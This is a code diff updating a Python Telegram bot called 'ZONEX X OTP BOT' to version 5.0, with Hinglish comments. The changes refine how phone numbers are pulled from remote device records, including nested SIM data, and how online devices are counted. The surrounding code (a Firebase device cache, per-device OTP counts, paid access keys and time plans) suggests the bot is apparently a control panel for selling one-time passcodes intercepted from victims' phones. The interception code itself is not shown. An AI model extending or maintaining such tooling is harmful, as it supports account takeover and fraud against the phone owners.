@@ -2,10 +2,10 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════╗
-║        ZONEX X OTP BOT v4.8              ║
+║        ZONEX X OTP BOT v5.0              ║
 ║  Channel Gate · Key Entry · Time Plans   ║
 ║  Referral · Multi-Firebase · Admin Panel ║
-║  FIX: Exact Online List & Count Match    ║
+║  FIX: Only Real Phone Numbers in List    ║
 ╚══════════════════════════════════════════╝
 """
 
@@ -311,7 +311,7 @@ def kb_channels(missing: list[str]) -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(rows)
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  ★★★ UNIFIED PHONE / ONLINE DETECTION (ACCURATE) ★★★
+#  ★★★ UNIFIED PHONE / ONLINE DETECTION (ONLY REAL NUMBERS) ★★★
 # ══════════════════════════════════════════════════════════════════════════════
 
 def _normalize_phone(ph) -> str:
@@ -324,7 +324,6 @@ def _normalize_phone(ph) -> str:
     if not s or s.lower() in bad_words:
         return "—"
     
-    # Sirf digits aur leading plus rakho
     digits = re.sub(r"[^\d+]", "", s)
     if not digits or digits in ("+", ""):
         return "—"
@@ -342,41 +341,59 @@ def _normalize_phone(ph) -> str:
 def _has_valid_phone(info: dict) -> bool:
     if not isinstance(info, dict):
         return False
+    # Har possible key check karo
     raw = (
         info.get("phone") or info.get("mobNo") or info.get("phoneNumber")
         or info.get("mobile") or info.get("Mobile") or info.get("phone_number")
-        or info.get("PhoneNumber") or ""
+        or info.get("PhoneNumber") or info.get("contact") or info.get("number")
+        or info.get("msisdn") or ""
     )
     if not raw:
         return False
     norm = _normalize_phone(raw)
     if norm == "—":
         return False
-    if len(re.sub(r"\D", "", norm)) < 6:
+    # Kam se kam 10 digit ka number hona chahiye
+    if len(re.sub(r"\D", "", norm)) < 10:
         return False
     return True
 
 def _extract_phone(info: dict) -> str:
     if not isinstance(info, dict):
         return "—"
-    for k in ("mobNo", "phoneNumber", "phone", "mobile", "Mobile",
-              "phone_number", "PhoneNumber", "contact", "number", "msisdn"):
+        
+    keys = ("mobNo", "phoneNumber", "phone", "mobile", "Mobile",
+            "phone_number", "PhoneNumber", "contact", "number", "msisdn")
+            
+    for k in keys:
         v = info.get(k)
         if v is not None and str(v).strip():
             n = _normalize_phone(v)
             if n != "—":
                 return n
+                
+    # Nested sims check
     sims = info.get("sims") or {}
     sim_list = sims if isinstance(sims, list) else list(sims.values())
     for sim in sim_list:
         if not isinstance(sim, dict):
             continue
-        for k in ("phoneNumber", "phone", "number", "msisdn", "mobile"):
+        for k in keys:
             v = sim.get(k)
             if v is not None and str(v).strip():
                 n = _normalize_phone(v)
                 if n != "—":
                     return n
+                    
+    # Nested dicts check
+    for k, v in info.items():
+        if isinstance(v, dict):
+            for kk in keys:
+                val = v.get(kk)
+                if val is not None and str(val).strip():
+                    n = _normalize_phone(val)
+                    if n != "—":
+                        return n
     return "—"
 
 def _is_online_fb(info: dict) -> bool:
@@ -403,15 +420,15 @@ def _build_device_record(info: dict, dev_id: str) -> dict:
     fb_online = _is_online_fb(info)
     is_online = bool(fb_online)
     
-    # Agar phone valid nahi hai, to list me ID dikhao taaki click ho sake
-    display_phone = phone if phone != "—" else f"ID-{dev_id[-6:]}"
+    # Agar phone valid hai, tabhi online count hoga
+    display_online = is_online and phone_ok
     
     ts_raw = (info.get("lastSeen") or info.get("last_seen")
               or info.get("lastOnline") or info.get("last_online") or "")
     return {
-        "online":    is_online,
+        "online":    display_online, # Only count if phone is valid
         "has_phone": phone_ok,
-        "phone":     display_phone, 
+        "phone":     phone, 
         "name":      str(info.get("modelName") or info.get("model")
                          or info.get("name") or dev_id),
         "battery":   str(info.get("battery", "—")),
@@ -531,9 +548,8 @@ async def refresh_all():
         last_refresh = now_dt().strftime("%H:%M:%S")
         logger.info(f"✅ Refresh done | {last_refresh}")
 
-# ─── Counters (Exact Match) ──────────────────────────────────────────────────
+# ─── Counters ────────────────────────────────────────────────────────────────
 def count_online() -> int:
-    # Count only if online is True
     return sum(
         1 for dm in device_cache.values()
         for d in dm.values()
@@ -547,7 +563,6 @@ def count_otps() -> int:
     return sum(len(ol) for om in otp_cache.values() for ol in om.values())
 
 def all_online() -> list:
-    # Ab list me wahi dikhega jo online hai (phone chahe valid ho ya na ho, display me ID dikh jayegi)
     return [
         (lb, did, info)
         for lb, dm in device_cache.items()
@@ -2547,7 +2562,7 @@ async def _on_startup(app):
 def main():
     if not BOT_TOKEN:
         logger.error("❌ BOT_TOKEN not set!"); return
-    logger.info("🚀 ZONEX X OTP Bot v4.8 starting...")
+    logger.info("🚀 ZONEX X OTP Bot v5.0 starting...")
     logger.info(f"👑 Admins: {ADMIN_IDS}")
     logger.info(f"📢 Channels: {CHANNELS}")
     logger.info(f"🔥 Firebase Project: {FS_PROJECT}")
